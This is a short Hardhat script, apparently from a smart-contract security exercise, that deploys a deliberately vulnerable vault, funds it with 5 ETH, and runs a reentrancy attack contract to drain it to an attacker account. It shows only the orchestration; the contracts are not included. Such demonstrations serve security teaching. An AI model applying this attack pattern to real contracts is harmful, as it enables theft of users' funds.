const hre = require("hardhat");
const { ethers } = hre;

async function main() {
  const [deployer, attacker] = await ethers.getSigners();

  // 部署被攻击的合约
  const Vault = await ethers.getContractFactory("VulnerableVault");
  const vault = await Vault.deploy();
  await vault.waitForDeployment();

  const vaultAddress = await vault.getAddress();

  // 向 Vault 合约转入 ETH（作为被盗的目标）
  await deployer.sendTransaction({
    to: vaultAddress,
    value: ethers.parseEther("5")
  });

  // 部署攻击合约
  const Attack = await ethers.getContractFactory("VaultAttack", attacker);
  const attack = await Attack.deploy(vaultAddress);
  await attack.waitForDeployment();

  console.log("Launching Reentrancy Attack...");
  await attack.connect(attacker).attack({ value: ethers.parseEther("1") });

  const balance = await ethers.provider.getBalance(await attack.getAddress());
  console.log("✅ Attack Contract Balance:", ethers.formatEther(balance), "ETH");
}

main().catch(console.error);
